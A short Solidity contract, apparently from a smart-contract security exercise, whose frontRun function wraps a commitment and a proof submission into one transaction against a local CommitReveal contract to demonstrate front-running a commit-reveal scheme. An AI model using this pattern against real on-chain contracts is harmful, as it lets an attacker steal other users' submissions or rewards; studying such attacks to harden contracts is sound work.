// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./CommitReveal.sol";

contract AttackCommitRevealWrapper {

    function frontRun(address _c, uint256 _proof, uint256 _randomSalt) external {
        CommitReveal commitReveal = CommitReveal(_c);
        bytes32 commitment = keccak256(abi.encodePacked(msg.sender, _proof, _randomSalt));
        commitReveal.register(commitment);
        commitReveal.submitProof(_proof, _randomSalt);
    }
}
